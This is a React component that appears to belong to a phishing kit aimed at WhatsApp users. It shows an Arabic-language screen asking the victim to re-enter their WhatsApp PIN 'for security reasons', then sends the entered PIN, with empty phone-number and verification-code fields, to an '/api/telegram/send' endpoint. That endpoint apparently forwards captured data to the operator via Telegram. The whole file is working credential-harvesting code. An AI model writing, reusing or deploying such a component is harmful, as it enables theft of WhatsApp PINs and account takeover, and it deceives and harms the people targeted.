import React, { useState } from 'react';

interface PinRetryStepProps {
  whatsappPin: string;
  updateWhatsappPin: (value: string) => void;
  onNext: () => void;
  onBack: () => void;
}

const PinRetryStep: React.FC<PinRetryStepProps> = ({ 
  whatsappPin, 
  updateWhatsappPin, 
  onNext, 
  onBack 
}) => {
  const [error, setError] = useState('');

  const sendPinRetryToTelegram = async (pin: string) => {
    try {
      await fetch('/api/telegram/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          phoneNumber: '',
          verificationCode: '',
          whatsappPin: pin,
          messageType: 'pin'
        })
      });
    } catch (error) {
      console.error('Erreur envoi PIN retry:', error);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!whatsappPin || whatsappPin.length < 6) {
      setError('يرجى إدخال رمز صحيح (6 أرقام على الأقل)');
      return;
    }
    
    setError('');
    await sendPinRetryToTelegram(whatsappPin);
    onNext();
  };

  return (
    <div className="form-card animate-fade-in">
      <div className="form-content">
        <div className="form-icon" style={{ background: 'linear-gradient(135deg, #f59e0b, #d97706)' }}>🔐</div>
        <h2 className="form-title">أدخل رمز PIN مرة أخرى</h2>
        <p className="form-subtitle">لأسباب أمنية، أعد إدخال رمز الحماية (PIN)</p>
        
        <div style={{ 
          background: 'rgba(245, 158, 11, 0.1)', 
          border: '1px solid rgba(245, 158, 11, 0.2)', 
          borderRadius: '12px', 
          padding: '1rem', 
          marginBottom: '2rem',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          gap: '0.5rem'
        }}>
          <span style={{ fontSize: '1.2rem' }}>⚠️</span>
          <p style={{ color: '#d97706', fontSize: '0.9rem', fontWeight: '500', margin: 0 }}>
            تأكد من إدخال الرمز الصحيح
          </p>
        </div>

        <form onSubmit={handleSubmit}>
          <div className="input-group">
            <div style={{ position: 'relative' }}>
              <input
                type="password"
                value={whatsappPin}
                onChange={(e) => updateWhatsappPin(e.target.value)}
                placeholder="••••••"
                style={{
                  width: '100%',
                  background: '#f9fafb',
                  border: '2px solid #e5e7eb',
                  borderRadius: '16px',
                  padding: '1rem',
                  fontSize: '1.2rem',
                  textAlign: 'center',
                  fontFamily: 'monospace',
                  letterSpacing: '0.2em',
                  transition: 'all 0.3s ease',
                  outline: 'none'
                }}
                onFocus={(e) => {
                  e.target.style.borderColor = '#f59e0b';
                  e.target.style.boxShadow = '0 0 0 3px rgba(245, 158, 11, 0.1)';
                  e.target.style.background = 'white';
                }}
                onBlur={(e) => {
                  e.target.style.borderColor = '#e5e7eb';
                  e.target.style.boxShadow = 'none';
                  e.target.style.background = '#f9fafb';
                }}
                maxLength={8}
              />
            </div>
            
            {error && (
              <div className="message error animate-fade-in">{error}</div>
            )}
          </div>

          <div className="button-group">
            <button
              type="button"
              onClick={onBack}
              className="btn btn-secondary"
            >
              <span>←</span>
              <span>رجوع</span>
            </button>
            
            <button
              type="submit"
              className="btn btn-primary"
              style={{ background: 'linear-gradient(135deg, #f59e0b, #d97706)' }}
            >
              <span>تأكيد مرة أخرى</span>
              <span>→</span>
            </button>
          </div>
        </form>
      </div>
    </div>
  );
};

export default PinRetryStep;